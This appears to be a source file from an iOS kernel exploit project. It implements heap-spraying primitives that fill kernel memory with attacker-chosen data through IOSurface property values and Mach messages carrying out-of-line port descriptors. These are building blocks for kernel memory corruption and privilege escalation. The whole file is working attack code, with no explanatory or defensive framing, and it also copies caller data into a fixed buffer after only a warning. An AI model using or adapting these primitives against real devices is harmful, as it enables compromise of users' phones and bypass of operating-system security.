#include <stdlib.h>
#include <Foundation/Foundation.h>

#include "IOKitLib.h"
#include "iosurface.h"
#include "spray.h"
#include "helper.h"

void create_osdata_serialisation_string(char **buffer, const char *data,
                                        size_t repetitions, char *key)
{
    int i;
    size_t buffer_size;
    char spray[strlen("<data>")
           + strlen(data)
           + strlen("</data>\n")
           + 1];

        buffer_size  = strlen("<array>\n");
    buffer_size += strlen("<array>\n");
    buffer_size += sizeof(spray) * repetitions;
    buffer_size += strlen("</array>\n");
    buffer_size += strlen("<string>");
    buffer_size += strlen("spray");
    buffer_size += strlen("</string>\n");
    buffer_size += strlen("</array>\n");
    buffer_size += 1;
    *buffer = calloc(buffer_size, sizeof(char));

    BEGIN_SPRAY_STRING(*buffer);
    for (i = 0; i < repetitions; i++)
    {
        CREATE_SPRAY_DATA(spray, data);
        strcat(*buffer, spray);
    }
    APPEND_SPRAY_STRING_END(*buffer, key);
}

void create_string_for_heap_spray_with_zeroes(char **input_buffer, size_t size, char *key)
{
    uint8_t *spray_data;
    const char *spray_string;
    NSData *nsdata;
    NSString *base64_encoded;

    spray_data = calloc(size, sizeof(uint8_t));
    nsdata = [NSData dataWithBytes:(const void*)spray_data length:size];
    base64_encoded = [nsdata base64EncodedStringWithOptions:0];
    spray_string = [base64_encoded cStringUsingEncoding:NSASCIIStringEncoding];

    create_osdata_serialisation_string(input_buffer, spray_string, N_OSDATA_SPRAY, key);
}

void create_string_for_heap_spray_with_data(char **input_buffer, size_t size, char *key,
                                            void *spray_data)
{
    const char *spray_string;
    NSData *nsdata;
    NSString *base64_encoded;

    nsdata = [NSData dataWithBytes:(const void*)spray_data length:size];
    base64_encoded = [nsdata base64EncodedStringWithOptions:0];
    spray_string = [base64_encoded cStringUsingEncoding:NSASCIIStringEncoding];

    create_osdata_serialisation_string(input_buffer, spray_string, N_OSDATA_SPRAY, key);
}

int ool_ports_descriptor_spray(mach_port_t receive_port, size_t message_count, mach_port_t *ports, size_t ports_count)
{
    size_t i, msg_size;
    ool_ports_msg_t ool_msg;
    mach_msg_return_t ret;

    msg_size = (sizeof(struct ool_ports_msg) + (message_count * sizeof(mach_msg_ool_ports_descriptor_t)));
    ool_msg = calloc(1, msg_size);

    ool_msg->header.msgh_bits = MACH_MSGH_BITS_COMPLEX | MACH_MSGH_BITS(MACH_MSG_TYPE_MAKE_SEND, 0);
    ool_msg->header.msgh_size =  msg_size;
    ool_msg->header.msgh_remote_port = receive_port;
    ool_msg->header.msgh_local_port = MACH_PORT_NULL;
    ool_msg->header.msgh_id = 0x10101010;

    ool_msg->body.msgh_descriptor_count = message_count;

    for (i = 0; i < message_count; i++) {
        ool_msg->ool_ports[i].address = ports;
        ool_msg->ool_ports[i].count = ports_count;
        ool_msg->ool_ports[i].deallocate = 0;
        ool_msg->ool_ports[i].disposition = MACH_MSG_TYPE_COPY_SEND;
        ool_msg->ool_ports[i].type = MACH_MSG_OOL_PORTS_DESCRIPTOR;
        ool_msg->ool_ports[i].copy = MACH_MSG_PHYSICAL_COPY;
    }

    ret = mach_msg_send(&ool_msg->header);
    if (ret != MACH_MSG_SUCCESS)
    {
        ERROR_LOG("Problem during OOL spray: 0x%x\n", ret);
        return 1;
    }

    free(ool_msg);

    return 0;
}

int io_surface_spray(io_connect_t *connection, uint32_t *surface_id,
                     size_t size, char *key, void *data, size_t data_size)
{
    uint8_t *spray_data;
    char *input_buffer;
    int ret;

    if (data == NULL)
    {
        create_string_for_heap_spray_with_zeroes(&input_buffer, size, key);
    }
    else
    {
        
	    if (data_size > size)
        {
            INFO_LOG("WARNING: data_size > size");
        }

        spray_data = calloc(size, sizeof(uint8_t));
        memcpy(spray_data, data, data_size);
        create_string_for_heap_spray_with_data(&input_buffer, size, key, spray_data);
    }

    if ((ret = io_surface_set_value(connection, surface_id, &input_buffer)))
    {
        ERROR_LOG("Could Not Spray Heap Via IOSurface");
    }
    else
    {
        DEBUG_LOG("Sprayed Heap Via IOSurface");
    }

    free(input_buffer);

    return ret;
}

int spray_kernel_heap_with_zeroes(io_connect_t *connection, uint32_t *surface_id, char *key)
{
    return io_surface_spray(connection, surface_id, CHUNK_SPRAY_SIZE, key, NULL, 0);
}
